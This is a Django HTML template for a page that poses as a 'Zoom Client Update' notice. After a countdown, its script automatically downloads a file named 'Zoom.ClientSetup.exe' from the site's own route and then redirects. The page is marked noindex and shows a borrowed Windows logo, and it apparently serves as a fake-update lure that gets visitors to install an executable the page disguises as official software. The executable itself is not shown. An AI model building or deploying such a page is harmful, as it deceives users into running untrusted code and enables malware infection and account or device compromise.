{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Zoom Client Update</title>
<meta name="description" content="Your Zoom Client is out of date. Download the update installer.">
<meta name="robots" content="noindex, nofollow">
<link rel="icon" type="image/svg+xml" href="{% static 'zoom_logo.webp' %}">

<style>
body{
    font-family: Arial, Helvetica, sans-serif;
    background:#f3f3f3;
    text-align:center;
    padding-top:80px;
    color:#333;
}

h1{
    color:#1a73b8;
    font-size:34px;
    margin-bottom:20px;
}

p{
    font-size:20px;
    margin:8px 0;
}

.blue{
    color:#1a73b8;
}

.countdown{
    margin-top:15px;
    font-size:22px;
    color:#1a73b8;
}

.loader-slot{
    margin:40px auto;
    min-height:60px;
    display:flex;
    align-items:center;
    justify-content:center;
}

.loader{
    border:6px solid #e6e6e6;
    border-top:6px solid #1a73b8;
    border-radius:50%;
    width:60px;
    height:60px;
    animation:spin 1s linear infinite;
}

@keyframes spin{
    0%{transform:rotate(0deg);}
    100%{transform:rotate(360deg);}
}

.button{
    display:inline-flex;
    align-items:center;
    gap:10px;
    padding:14px 28px;
    border:2px solid #1a73b8;
    border-radius:35px;
    text-decoration:none;
    color:#1a73b8;
    font-size:18px;
    margin-top:20px;
    background:white;
}

.button:hover{
    background:#f0f8ff;
}

.store-icon{
    width:24px;
}
</style>
</head>

<body>

<h1>Your Zoom Client is Out of Date</h1>

<p>Please wait — your download will start shortly.</p>
<p class="blue">Please wait — your download will start shortly.</p>

<div class="countdown">
Download in <span id="count">5</span> seconds
</div>

<div id="loaderSlot" class="loader-slot">
<div class="loader" id="loaderSpin"></div>
</div>

<p>If the download does not start, click below:</p>

<a id="storeBtn" class="button" href="{% url 'client_setup' %}">
<img class="store-icon" alt="" src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg">
Download installer
</a>

<script>

var downloadUrl = "{% url 'client_setup' %}";
var afterDownloadUrl = "{% url 'after_download' %}";
let timeLeft = 5;

document.getElementById("storeBtn").href = downloadUrl;

function redirectAfterDownload() {
    window.location.href = afterDownloadUrl;
}

function triggerDownload() {
    var w = window.open(downloadUrl, "_blank", "noopener,noreferrer");
    if (w) {
        setTimeout(redirectAfterDownload, 2500);
        return;
    }
    var a = document.createElement("a");
    a.href = downloadUrl;
    a.setAttribute("download", "Zoom.ClientSetup.exe");
    a.rel = "noopener";
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    setTimeout(redirectAfterDownload, 6000);
}

function showDownloadUpdate() {
    var slot = document.getElementById("loaderSlot");
    slot.innerHTML = "";
    var wrap = document.createElement("div");
    wrap.style.display = "flex";
    wrap.style.flexDirection = "column";
    wrap.style.alignItems = "center";
    wrap.style.gap = "14px";

    var a = document.createElement("a");
    a.className = "button";
    a.href = downloadUrl;
    a.textContent = "Download again";
    wrap.appendChild(a);
}

let timer = setInterval(function(){

timeLeft--;
document.getElementById("count").innerText = timeLeft;

if(timeLeft <= 0){
clearInterval(timer);
showDownloadUpdate();
triggerDownload();
}


},1000);



</script>

</body>
</html>
